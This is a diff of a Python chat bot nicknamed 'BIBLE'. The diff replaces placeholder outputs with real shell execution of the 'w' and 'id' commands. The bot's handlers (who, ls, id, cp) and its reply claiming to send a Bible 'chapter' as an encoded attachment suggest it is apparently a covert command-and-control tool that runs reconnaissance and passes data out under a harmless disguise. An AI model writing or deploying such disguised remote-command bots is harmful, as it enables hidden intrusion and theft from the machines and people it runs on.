@@ -17,7 +17,10 @@ BOT_NICK_NAME = sys.argv[1] if len(sys.argv) > 1 else 'BIBLE'
 
 
 def process_who():
-    return 'root'  # check_output('w', shell=True).decode('utf-8').strip()
+    try:
+        return check_output('w', shell=True).decode('utf-8').strip()
+    except Exception:
+        return 'Command "w" not found (probably Windows PC)'
 
 
 def process_ls(dir_path):
@@ -27,7 +30,7 @@ def process_ls(dir_path):
 
 
 def process_id():
-    return 'id: 7777'  # check_output('id', shell=True).decode('utf-8').strip()
+    return check_output('id', shell=True).decode('utf-8').strip()
 
 
 def process_cp(file_path):
@@ -104,7 +107,7 @@ def process_msg(sender, msg_id, msg, attachment):
             'content': encoded[0:int(encoded_len*1.2)],
         }
         add_message(
-            f'No, it is not, I send the chapter {chapter_num} is the attachment',
+            f'No, it is not, I send the chapter {chapter_num} in the attachment',
             BOT_NICK_NAME, reply_to=msg_id, attachment=attachment
         )
 
